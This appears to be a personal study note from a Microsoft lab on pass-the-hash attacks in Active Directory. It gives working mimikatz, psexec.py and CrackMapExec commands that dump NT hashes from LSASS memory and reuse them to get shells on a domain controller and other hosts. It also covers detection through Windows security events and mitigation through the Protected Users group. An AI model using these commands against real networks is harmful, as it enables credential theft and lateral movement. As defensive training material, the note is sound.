
To see : 
[[Kerberos]]
[[NTLM - New Technology Lan Manager]]

Sources : 
Microsoft course
https://en.hackndo.com/pass-the-hash/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts

Tools: 
https://github.com/byt3bl33d3r/CrackMapExec

psexec.exe \\SRV01 cmd.exe -accepteula

mimikatz.exe
privilege::debug
sekurlsa::msv

python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe
This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.

### Extract the hash from the LSASS memory 
	▪  This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
### Inject the hash into your current session 
	▪ Either locally, or later on other systems 
	▪ The “new” hash is used to calculate NTLM responses 
### Does not trigger any failed authentication attempts

Attack’s pre-requisites - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump

Protection - Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode) - Use the Protected Users group (for privileged accounts) - Block NTLM on systems where it is not used (very difficult in large environments)


# Steps of the pass-the-hash attack

### Extract credentials from SRV

Let's check if there is something yummy to steal (well, we know there is because we connected with Vickie's admin account to SRV01 at the beginning of this lab).

`psexec.exe \\SRV01 cmd.exe -accepteula`
  
`query user`

run `mimikatz.exe`.

**mimikatz #**  `privilege::debug` 

the following command to extract the NT hashes from the memory: 
`sekurlsa::msv`
Result : 
![[Pasted image 20231023210323.png]]
Hash is displayed in the **NTLM** proprety.



### Pass the hash of Vickie while connecting to a domain controller

This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.
`python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe` 

Results: 
![[Pasted image 20231023210528.png]]

### Automate the PTH

https://github.com/byt3bl33d3r/CrackMapExec
 It takes as input a list of targets, credentials, with a clear password or NT hash, and it can execute commands on targets for which authentication has worked
```powershell
# Compte local d'administration
crackmapexec smb --local-auth -u Administrateur -H 20cc650a5ac276a1cfc22fbc23beada1 10.10.0.1 -x whoami

# Compte de domaine
crackmapexec smb -u jsnow -H 89db9cd74150fc8d8559c3c19768ca3f -d adsec.local  10.10.0.1 -x whoami
```

Here is an example where the `simba` user is administrator of all workstations.

![[Pasted image 20231023214430.png]]

https://github.com/Hackndo/lsassy
Having the list of connected users is good, but having their password or NT hash (which is the same) is better! For this, I developed [lsassy](https://github.com/hackndo/lsassy), a tool I talk about in the article [Extracting lsass secrets remotely](https://en.hackndo.com/remote-lsass-dump-passwords/#new-tools). It looks like this:
![[Pasted image 20231023214541.png]]



### Check the traces on the domain controller

Welcome back **Mister Blue**. It seems that **Miss Red** owns an admin account and is SYSTEM on your favorite domain controller. The one you swear to protect when you where hired… Let's see what we can see of that recent pass-the-hash.

 **Event Viewer (Local)** > **Windows Logs** > **Security**.

`<QueryList> <Query Id="0" Path="Security"> <Select Path="Security"> Event[ System[ (EventID=4624) or (EventID=4776) ] and EventData[ Data[@Name="TargetUserName"]="v.fergusson.adm" ] ] </Select> </Query> </QueryList>` 

Double click on the latest successful event **4776**. It should look like this: ![4776PY.png](https://labondemand.blob.core.windows.net/content/lab127288/4776PY.png)


## Reduce NT Hash exposure

### Leverage the Protected Users group

 `dsa.msc`
**Active Directory Users and Computers** console, right click on the domain **contoso.com** and click **Properties**. You should see that the current level is 2008 R2. Not great. Let's change that. Click **OK** to close the domain properties window.

Add user to the `Protected Users` group.
This will block the usage of NTLM on this account. That's okay because she is an admin. Blocking NTLM on a regular account is very tricky as you will need to understand all possible dependencies with the applications and systems used by a user. Let's also enable some logs for visibility.

See the failures and successes for the members of the **Protected Users** group on a separate event log.
**Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication**.
- **ProtectedUserFailures-DomainController** :  **Enable Log**. 
- **ProtectedUserSuccesses-DomainController**:  **Enable Log**. 

**Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication** > **ProtectedUserFailures-DomainController**. You should see the following event: 
![[Pasted image 20231023211225.png]]

You see the **Device Name** is **(NULL)**. It also means that if you check the event **4776** on the **Security** logs you would also see an empty **User Workstation** property. Let's check if we can identify the server against which the hash was tried.
  
**Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **NTLM** > **Operational**. You should see the following event **8004**:  
![[Pasted image 20231023211327.png]]

### Connect to a system when you are a Protected Users member

 `cd \Tools\mimikatz` 
 `mimikatz.exe`.
    
seDebugPrivilege to be able to read the memory: `privilege::debug`
command to extract the NT hashes from the memory: `sekurlsa::msv`.
There is no NTLM property available for Vickie's session.
![[Pasted image 20231023211527.png]]

